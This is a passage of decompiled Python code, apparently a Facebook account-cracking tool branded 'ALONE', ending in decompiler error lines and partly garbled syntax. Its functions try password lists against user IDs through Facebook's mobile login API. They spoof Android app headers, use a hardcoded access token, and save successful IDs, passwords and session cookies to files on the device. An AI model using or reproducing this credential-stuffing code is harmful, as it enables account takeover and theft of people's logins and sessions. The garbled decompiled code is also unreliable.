            'User-Agent': HOP_M5(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[38;5;244m(\x1b[38;5;46mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;46m ' + ids + ' ━\x1b[38;5;244m➤\x1b[38;5;46m ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r\x1b[38;5;244m=(\x1b[38;5;46m💚\x1b[38;5;244m)={A} ''' + coki)
            print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            open('/sdcard/ALONE-FILE-M1-OK.txt', 'a').write(ids + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r\x1b[38;5;244m({Y}ALONE-CP[🖤]\x1b[38;5;244m){Y} ''' + ids + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                '1'
            'generate_machine_id'
        loop += 1
        return None
        if Exception:
            e = '1'
            e = None
            del e
            return None
        e = '1'
        del e


def rndm1(uid, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m[ALONE-[💚]<>[\x1b[38;5;46m%s\x1b[38;5;46m]\x1b[38;5;46m<>[\x1b[38;5;46mOK\x1b[38;5;244m/\x1b[38;5;46mCP]<>[\x1b[38;5;46m%s\x1b[38;5;244m/\x1b[38;5;46m%s]''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    for pas in passlist:
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Connection-Type': 'mobile.CTRadioAccessTechnologyLTE',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Type': 'unknown',
            'User-Agent': HOP_M1(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[38;5;244m(\x1b[38;5;46mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;46m ' + uid + ' ━\x1b[38;5;244m➤\x1b[38;5;46m ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46mCOOKIE\x1b[38;5;244m)>{A} ''' + coki)
            open('/sdcard/ALONE-RANDOM-M1-OK.txt', 'a').write(uid + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(uid)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r\x1b[38;5;244m({Y}ALONE-CP[🖤]\x1b[38;5;244m){Y} ''' + uid + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
                'button_with_disabled'
            'error_detail_type'
        loop += 1
        return None
        if Exception:
            e = 'method/auth.login'
            e = None
            del e
            return None
        e = 'method/auth.login'
        del e


def rndm2(uid, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m[ALONE-[💚]<>[\x1b[38;5;46m%s\x1b[38;5;46m]\x1b[38;5;46m<>[\x1b[38;5;46mOK\x1b[38;5;244m/\x1b[38;5;46mCP]<>[\x1b[38;5;46m%s\x1b[38;5;244m/\x1b[38;5;46m%s]''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    for pas in passlist:
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Connection-Type': 'mobile.CTRadioAccessTechnologyLTE',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Type': 'unknown',
            'User-Agent': HOP_M2(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://b-graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[38;5;244m(\x1b[38;5;46mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;46m ' + uid + ' ━\x1b[38;5;244m➤\x1b[38;5;46m ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46mCOOKIE\x1b[38;5;244m)>{A} ''' + coki)
            open('/sdcard/ALONE-RANDOM-M1-OK.txt', 'a').write(uid + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(uid)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r\x1b[38;5;244m({Y}ALONE-CP[🖤]\x1b[38;5;244m){Y} ''' + uid + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
                'button_with_disabled'
            'error_detail_type'
        loop += 1
        return None
        if Exception:
            e = 'method/auth.login'
            e = None
            del e
            return None
        e = 'method/auth.login'
        del e


def rndm3(uid, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m[ALONE-[💚]<>[\x1b[38;5;46m%s\x1b[38;5;46m]\x1b[38;5;46m<>[\x1b[38;5;46mOK\x1b[38;5;244m/\x1b[38;5;46mCP]<>[\x1b[38;5;46m%s\x1b[38;5;244m/\x1b[38;5;46m%s]''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    for pas in passlist:
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Connection-Type': 'mobile.CTRadioAccessTechnologyLTE',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Type': 'unknown',
            'User-Agent': HOP_M3(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[38;5;244m(\x1b[38;5;46mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;46m ' + uid + ' ━\x1b[38;5;244m➤\x1b[38;5;46m ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46mCOOKIE\x1b[38;5;244m)>{A} ''' + coki)
            open('/sdcard/ALONE-RANDOM-M1-OK.txt', 'a').write(uid + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(uid)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r\x1b[38;5;244m({Y}ALONE-CP[🖤]\x1b[38;5;244m){Y} ''' + uid + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
                'button_with_disabled'
            'error_detail_type'
        loop += 1
        return None
        if Exception:
            e = 'method/auth.login'
            e = None
            del e
            return None
        e = 'method/auth.login'
        del e


def rndm4(uid, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m[ALONE-[💚]<>[\x1b[38;5;46m%s\x1b[38;5;46m]\x1b[38;5;46m<>[\x1b[38;5;46mOK\x1b[38;5;244m/\x1b[38;5;46mCP]<>[\x1b[38;5;46m%s\x1b[38;5;244m/\x1b[38;5;46m%s]''' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    for pas in passlist:
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.625,width=1080,height=1920};FBLC/' + fblc + ';FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        headers = {
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Connection-Type': 'mobile.CTRadioAccessTechnologyLTE',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Type': 'unknown',
            'User-Agent': HOP_M4(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://b-graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[38;5;244m(\x1b[38;5;46mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;46m ' + uid + ' ━\x1b[38;5;244m➤\x1b[38;5;46m ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print(f'''\r\r\x1b[38;5;244m(\x1b[38;5;46mCOOKIE\x1b[38;5;244m)>{A} ''' + coki)
            open('/sdcard/ALONE-RANDOM-M1-OK.txt', 'a').write(uid + ' | ' + pas + ' |-> ' + coki + '\n')
            oks.append(uid)
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r\x1b[38;5;244m({Y}ALONE-CP[🖤]\x1b[38;5;244m){Y} ''' + uid + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/ALONE-CP.txt', 'a').write(uid + '|' + pas + '\n')
                cps.append(uid)
                'button_with_disabled'
            'error_detail_type'
        loop += 1
        return None
        if Exception:
            e = 'method/auth.login'
            e = None
            del e
            return None
        e = 'method/auth.login'
        del e

approval()
return None
if requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
    exit()
    return None
if None:
    e = None
    print(e)
    e = None
    del e
    return None
e = None
del e

Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: BEFORE_WITH
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
